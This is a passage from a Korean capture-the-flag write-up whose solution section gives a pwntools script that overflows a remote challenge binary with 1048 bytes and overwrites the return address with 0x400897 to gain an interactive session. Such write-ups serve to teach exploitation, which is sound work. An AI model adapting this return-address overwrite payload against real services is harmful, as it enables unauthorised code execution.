### 3. 풀이

최종 익스 코드는 다음과 같다  
```python
from pwn import *

p = remote("ctf.j0n9hyun.xyz",3013)

p.recvuntil("Which environment variable do you want to read?")

payload = "A"*1048
payload += p64(0x0000000000400897)

p.sendline(payload)
p.interactive()
```
